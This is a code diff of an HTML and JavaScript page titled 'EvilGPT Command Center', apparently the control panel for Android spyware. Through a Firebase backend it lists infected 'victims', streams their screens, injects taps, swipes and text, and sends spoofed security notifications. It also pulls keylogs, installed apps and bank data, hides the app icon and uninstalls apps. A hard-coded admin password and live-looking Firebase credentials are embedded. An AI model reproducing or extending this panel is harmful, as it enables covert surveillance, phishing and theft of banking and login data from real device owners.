@@ -2,211 +2,236 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EvilGPT Commander</title>
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
-
+    <!-- Firebase Compat SDKs (same version used in APK) -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#0a0e14; color:#c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        .container { max-width:800px; margin:auto; padding:20px; }
-        .header { text-align:center; margin-bottom:30px; }
-        .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:20px; margin:15px 0; }
-        select, input, button { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:10px; border-radius:6px; font-size:14px; }
-        button { cursor:pointer; transition:0.2s; }
+        body { background:#0a0e14; color:#c9d1d9; font-family:'Segoe UI',Tahoma,sans-serif; min-height:100vh; padding:20px; }
+        .container { max-width:900px; margin:auto; }
+        .header { text-align:center; margin-bottom:30px; color:#58a6ff; }
+        .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:20px; margin-bottom:16px; }
+        select, input:not([type=file]), button { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:10px; border-radius:6px; font-size:14px; margin:4px 0; width:100%; }
+        button { cursor:pointer; transition:background 0.2s; width:auto; }
         button:hover { background:#30363d; }
-        .btn-danger { background:#da3633; }
+        .btn-danger { background:#da3633; border-color:#f85149; }
         .btn-danger:hover { background:#f85149; }
         .btn-success { background:#238636; }
-        .flex { display:flex; gap:10px; align-items:center; }
-        img#screenFrame { max-width:100%; border-radius:8px; margin:10px 0; }
-        .output { background:#0d1117; padding:15px; border-radius:8px; max-height:300px; overflow-y:auto; font-family:monospace; }
-        label { font-weight:500; display:block; margin-bottom:5px; }
-        .spacer { height:15px; }
-        .notification-upload { display:flex; align-items:center; gap:10px; }
-        .notification-upload input[type=file] { display:none; }
-        .upload-label { padding:8px 16px; background:#7c8b1c; border-radius:6px; cursor:pointer; }
+        .btn-warn { background:#9e6a03; }
+        .flex { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
+        img#screenFrame { width:100%; border-radius:8px; margin-top:10px; background:#000; }
+        .output { background:#0d1117; padding:15px; border-radius:8px; max-height:300px; overflow-y:auto; font-family:monospace; white-space:pre-wrap; }
+        label { font-weight:500; display:block; margin-bottom:4px; }
+        .upload-label { padding:8px 16px; background:#238636; border-radius:6px; cursor:pointer; display:inline-block; color:#fff; }
+        input[type=file] { display:none; }
+        .password-section { display:flex; flex-direction:column; align-items:center; margin-top:50px; }
+        .password-section > * { margin-bottom:10px; }
+        .hidden { display:none; }
+        .note { color:#8b949e; font-size:13px; margin-top:10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1 class="header">💀 EvilGPT Command Center</h1>
+<div class="container" id="mainPanel" class="hidden">
+    <h1 class="header">💀 EvilGPT Command Center</h1>
 
-        <!-- Device Selection -->
-        <div class="card">
-            <label>🎯 Target device:</label>
-            <select id="deviceSelect"></select>
-            <button onclick="refreshDevices()">⟳ Refresh</button>
+    <!-- Device Selection -->
+    <div class="card">
+        <label>🎯 Target Device:</label>
+        <select id="deviceSelect"><option>Loading...</option></select>
+        <button onclick="refreshDevices()">⟳ Refresh</button>
+    </div>
+
+    <!-- Screen Stream -->
+    <div class="card">
+        <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="Screen">
+        <button onclick="sendCmd({type:'start_screen_capture'})">⟡ Start Screen Capture</button>
+    </div>
+
+    <!-- Touch & Swipe -->
+    <div class="card">
+        <h3>👆 Touch & Swipe</h3>
+        <div class="flex">
+            X: <input id="tapX" type="number" value="200" style="width:80px;">
+            Y: <input id="tapY" type="number" value="300" style="width:80px;">
+            <button class="btn-success" onclick="sendCmd({type:'tap', x:+document.getElementById('tapX').value, y:+document.getElementById('tapY').value})">Tap</button>
         </div>
-
-        <!-- Screen Stream -->
-        <div class="card">
-            <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="Screen">
-            <button onclick="snendCommand('SCREEN_REFRESH')">⟡ Refresh Screen</button>
-        </div>
-
-        <!-- Touch and Typing -->
-        <div class="card">
-            <h3>👆 Touch & Swipe</h3>
-            <div class="flex">
-                <input id="tapX" type="number" placeholdr="X" value="200" style="width:80px">
-                <input id="tapY" type="number" placeholdr="Y" value="300" style="width:80px">
-                <button onclick="sendCommand(`TAP ${getTapCoords()}`)">Tap</button>
-                <button onclick="sendCommand(`SWIPE ${getTapCoords()} ${getSwipeEnd()}`)">Swipe</button>
-            </div>
-            <div class="flex">
-                <input id="swipeEndX" type="number" placeholdr="End X" value="400">
-                <input id="swipeEndY" type="number" placeholdr="End Y" value="500">
-            </div>
-            <div class="spacer"></div>
-            <input id="typeText" placeholdr="Unlock pattern / message" style="width:100%">
-            <button onclick="sendCommand(`TYPE ${enoodeURIComponent(getTypeText())}`)">⌨ Type</button>
-        </div>
-
-        <!-- Spoof Notification with Photo Upload -->
-        <div class="card">
-            <h3>💣 Spoof Notification</h3>
-            <input id="notifTitle" placeholdr="Bank Alert" value="Security Notice">
-            <input id="notifBody" placeholdr="Your account was accessd" value="Immediate action requred.">
-            <div class="notification-upload">
-                <label class="upload-label" for="notifImage">📷 Choose image</label>
-                <input type="file" id="notifImage" accept="image/*" onchange="handeNotifImage(this)">
-                <spn id="uploadStatuss"></spn>
-            </div>
-            <button onclick="snendNotif()">✉ Send Spoof</button>
-            <!-- The download URL will be stored hidden -->
-            <input type="hidden" id="notifIconUrl" value="">
-        </div>
-
-        <!-- Data Extraction -->
-        <div class="card">
-            <h3>🔥 Data Extraction</h3>
-            <div class="flex">
-                <button onclick="sendCommand('KEYLOGS')">Keylogs</button>
-                <button onclick="sendCommand('APPS')">App List</button>
-                <button onclick="sendCommand('BANK_DATA')">Bank Info</button>
-            </div>
-            <pre id="infoOutput" class="output"></pre>
-        </div>
-
-        <!-- Danger Zone -->
-        <div class="card">
-            <button class="btn-dangr" onclick="sendCommand('UNINSTALL')">🧹 Uninstall Victim App</button>
-            <button class="btn-dangr" onclick="sendCommand('HIDE')">👤 Hide Icon</button>
+        <div class="flex">
+            Swipe from (X1,Y1): <input id="swX1" type="number" value="100" style="width:80px;"> <input id="swY1" type="number" value="300" style="width:80px;">
+            to (X2,Y2): <input id="swX2" type="number" value="400" style="width:80px;"> <input id="swY2" type="number" value="500" style="width:80px;">
+            <button class="btn-warn" onclick="sendCmd({type:'swipe', sx:+document.getElementById('swX1').value, sy:+document.getElementById('swY1').value, ex:+document.getElementById('swX2').value, ey:+document.getElementById('swY2').value})">Swipe</button>
         </div>
     </div>
 
-    <script>
-        // Firebase config – replace with yours
-        const firabaseConfig = {
-            apiKey: "AIzaSyB7z--EY6xgXUJnov3XopPbvQRkBYGKHZ0",
-            authDomain: "vfvdfscf.firebaseapp.com",
-            databaseURL: "https://vfvdfscf-default-rtdb.firebaseio.com",
-            projectId: "vfvdfscf",
-            storageBucket: "vfvdfscf.appspot.com",
-            messagingSenderId: "918007122795",
-            appId: "1:918007122795:web:2c99cf787cffcbd9ba5a2e"
-        };
-        firebase.initializeApp(firabaseConfig);
-        const db = firebase.database();
-        const storage = firebase.storage();
-        let selectedDevice = null;
+    <!-- Typing -->
+    <div class="card">
+        <h3>⌨ Type Text</h3>
+        <input id="typeText" placeholder="Enter text to inject...">
+        <button onclick="sendCmd({type:'type', text:document.getElementById('typeText').value})">Inject Text</button>
+    </div>
 
-        // Utils
-        function $(id) { return document.getElementById(id); }
+    <!-- Fake Notification (with Photo Upload) -->
+    <div class="card">
+        <h3>💣 Spoof Notification</h3>
+        <input id="notifTitle" placeholder="Notification Title" value="Security Alert">
+        <input id="notifBody" placeholder="Notification Body" value="Immediate action required.">
+        <div class="flex" style="align-items:center; margin-top:10px;">
+            <label class="upload-label" for="notifImage">📷 Upload Photo</label>
+            <input type="file" id="notifImage" accept="image/*" onchange="uploadNotifImage(this)">
+            <span id="uploadStatus"></span>
+        </div>
+        <button class="btn-danger" onclick="sendFakeNotif()">✉ Send Spoof</button>
+        <input type="hidden" id="notifIconUrl" value="">
+    </div>
 
-        // Refresh device list
-        function refreshDevices() {
-            db.ref('devices').n('value', snap => {
-                const select = $('deviceSelect');
-                select.innerHTML = '';
-                snap.forEach(child => {
-                    const opt = document.reateElement('option');
-                    opt.Value = child.key;
-                    opt.textContent = child.val().name || child.key;
-                    select.appendChild(opt);
-                });
-                if (select.ptions.length > 0 && !selectedDevice) {
-                    selectedDevice = select.ptions[0].value;
-                    select.value = selectedDevice;
-                    attachListeners();
-                }
-            });
+    <!-- Data Extraction -->
+    <div class="card">
+        <h3>🔥 Data Extraction</h3>
+        <div class="flex">
+            <button onclick="sendCmd({type:'get_keylogs'})">Keylogs</button>
+            <button onclick="sendCmd({type:'get_apps'})">App List</button>
+            <button onclick="sendCmd({type:'get_bank_data'})">Bank Data</button>
+        </div>
+        <pre id="infoOutput" class="output">No data yet...</pre>
+    </div>
+
+    <!-- Danger Zone -->
+    <div class="card">
+        <h3>☠ Danger Zone</h3>
+        <div class="flex">
+            <button onclick="sendCmd({type:'hide_activity'})">👤 Hide Icon</button>
+            <button class="btn-danger" onclick="if(confirm('Uninstall victim app?')) sendCmd({type:'uninstall'})">🧨 Uninstall</button>
+        </div>
+    </div>
+</div>
+
+<!-- Login Screen -->
+<div id="loginContainer" class="password-section">
+    <h2>🔐 Enter Password</h2>
+    <input type="password" id="passInput" placeholder="Admin password">
+    <button onclick="checkPassword()">Login</button>
+    <p class="note">⚠️ Existing infected devices will appear instantly after login. No waiting.</p>
+</div>
+
+<script>
+    // ------------------------- FIREBASE CONFIG (FROM YOUR JSON) -------------------------
+    const firebaseConfig = {
+        apiKey: "AIzaSyB7z--EY6xgXUJnov3XopPbvQRkBYGKHZ0",
+        authDomain: "vfvdfscf.firebaseapp.com",
+        databaseURL: "https://vfvdfscf-default-rtdb.firebaseio.com",
+        projectId: "vfvdfscf",
+        storageBucket: "vfvdfscf.firebasestorage.app",
+        messagingSenderId: "918007122795",
+        appId: "1:918007122795:web:2c99cf787cffcbd9ba5a2e"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const storage = firebase.storage();
+
+    // ------------------------- AUTH -------------------------
+    const CORRECT_PASSWORD = "adminpassord$#@322";
+    let selectedDevice = null;
+
+    function checkPassword() {
+        if (document.getElementById('passInput').value === CORRECT_PASSWORD) {
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('mainPanel').classList.remove('hidden');
+            refreshDevices();
+        } else {
+            alert('Wrong password!');
         }
-        document.getElectById('deviceSelect').ddEventListener('change', function() {
-            selectedDevice = this.value;
-            attachListeners();
+    }
+
+    // ------------------------- DEVICE LIST (including pre-existing) -------------------------
+    function refreshDevices() {
+        db.ref('telegram2_secret/victims').on('value', snap => {
+            const select = document.getElementById('deviceSelect');
+            select.innerHTML = '';
+            if (!snap.exists()) {
+                select.innerHTML = '<option>No devices</option>';
+                return;
+            }
+            snap.forEach(child => {
+                const data = child.val();
+                const opt = document.createElement('option');
+                opt.value = child.key;
+                opt.textContent = `${data.deviceName || 'Unknown'} (Android ${data.androidVersion || '?'})`;
+                select.appendChild(opt);
+            });
+            if (select.options.length > 0 && !selectedDevice) {
+                selectedDevice = select.options[0].value;
+                select.value = selectedDevice;
+                attachListeners();
+            }
         });
+    }
 
-        function attachListeners() {
-            if (!selectedDevice) return;
-            // Live screen stream
-            db.ref(`devices/${selectedDevice}/screen_frame`).n('value', snap => {
-                if (snap.exist()) {
-                    $('screenFrame')..src = `data:image/jpeg;base64,${snap.val()}`;
-                }
-            });
-            // Info (keylogs, apps, bank)
-            db.ref(`devices/${selectedDevice}/info`).on('value', snap => {
-                const data = snap.val() || {};
-                let out = '';
-                if (data.keylogs) out += `Keylogs:\n${data.keylogs}\n\n`;
-                if (data.apps) out += `Installed Apps:\n${data.apps}\n`;
-                $('infoOutput').textContent = out || 'No data yet';
-            });
-            // Bank data
-            db.ref(`devices/${selectedDevice}/bank`).on('value', snap => {
-                const data = snap.val();
- if (data) $('infoOutput').textContent += `\nBank Data:\n${JSON.stringify(data, null, 2)}`;
-            });
-        }
+    document.getElementById('deviceSelect').addEventListener('change', function() {
+        selectedDevice = this.value;
+        attachListeners();
+    });
 
-        // Send command
-        function sendCommand(cmd) {
-            if (!selectedDevice) return alrt('Select a device');
-            db.ref(`devices/${selectedDevice}/command`).set({ cmd, timestamp: Date.now() });
-        }
+    // ------------------------- LIVE LISTENERS -------------------------
+    function attachListeners() {
+        if (!selectedDevice) return;
+        // Screen stream
+        db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).off();
+        db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).on('value', snap => {
+            if (snap.exists()) {
+                document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + snap.val();
+            }
+        });
+        // Info (keylogs, apps)
+        db.ref(`telegram2_secret/victims/${selectedDevice}/info`).off();
+        db.ref(`telegram2_secret/victims/${selectedDevice}/info`).on('value', snap => {
+            const data = snap.val() || {};
+            let out = '';
+            if (data.keylogs) out += '🔑 Keylogs:\n' + data.keylogs + '\n\n';
+            if (data.apps) out += '📱 Installed Apps:\n' + data.apps + '\n\n';
+            document.getElementById('infoOutput').textContent = out || 'No data yet';
+        });
+        // Bank data
+        db.ref(`telegram2_secret/victims/${selectedDevice}/bank`).off();
+        db.ref(`telegram2_secret/victims/${selectedDevice}/bank`).on('value', snap => {
+            const data = snap.val();
+            if (data) {
+                const current = document.getElementById('infoOutput').textContent + '\n💰 Bank Data:\n' + JSON.stringify(data, null, 2);
+                document.getElementById('infoOutput').textContent = current;
+            }
+        });
+    }
 
-        // Tap coord helpers
-        function getTapCoords() {
-            return `${$('tapX').value} ${$('tapY').value}`;
-        }
-        function getSwipeEnd() {
-            return `${$('swipeEndX').value} ${$('swipeEndY').value}`;
-        }
-        function getTypeText() { return $('typeText').value; }
+    // ------------------------- SEND COMMAND -------------------------
+    function sendCmd(obj) {
+        if (!selectedDevice) return alert('Select a device first!');
+        db.ref(`telegram2_secret/victims/${selectedDevice}/commands`).push().set(obj);
+    }
 
-        // Notification with photo upload
-        let notifIconUrl = '';
-        function handleNotifImage(input) {
-            const file = input.files[0];
-            if (!file) return;
-            const status = $('uploadStatus');
-            status.textContent = 'Uploading...';
-            const storageRef = storage.ref(`notif_images/${Date.now()}_${file.name}`);
-            storageRef.put(file).then(snapshot => {
-                snapshot.ref.getDownloadURL().then(url => {
-                    $('notifIconUrl').value = url;
-                    status.textContent = '✓ Image ready';
-                });
-            }).catch(err => {
-                status.textContent = 'Upload failed';
-            });
-        }
-        function sendNotif() {
-            const title = encodeURIComponent($('notifTitle').value);
-            const body = encodeURIComponent($('notifBody').value);
-            const iconUrl = $('notifIconUrl').value;
-            // Command format: NOTIF <base64_title> <base64_body> <iconUrl>
-            const cmd = `NOTIF ${btoa(unescape(encodeURIComponent(title)))} ${btoa(unescape(encodeURIComponent(body)))} ${iconUrl}`;
-            sendCommand(cmd);
-        }
+    // ------------------------- NOTIFICATION WITH IMAGE UPLOAD -------------------------
+    function uploadNotifImage(input) {
+        const file = input.files[0];
+        if (!file) return;
+        document.getElementById('uploadStatus').textContent = 'Uploading...';
+        const ref = storage.ref('notif_images/' + Date.now() + '_' + file.name);
+        ref.put(file).then(snapshot => snapshot.ref.getDownloadURL()).then(url => {
+            document.getElementById('notifIconUrl').value = url;
+            document.getElementById('uploadStatus').textContent = '✅ Image ready';
+        }).catch(() => document.getElementById('uploadStatus').textContent = '❌ Failed');
+    }
 
-        // Initial load
-        refreshDevices();
-    </script>
+    function sendFakeNotif() {
+        const title = document.getElementById('notifTitle').value;
+        const body = document.getElementById('notifBody').value;
+        const iconUrl = document.getElementById('notifIconUrl').value || '';
+        sendCmd({
+            type: 'fake_notification',
+            title: btoa(unescape(encodeURIComponent(title))),
+            text: btoa(unescape(encodeURIComponent(body))),
+            iconUrl: iconUrl
+        });
+    }
+</script>
 </body>
-    </html>
+</html>
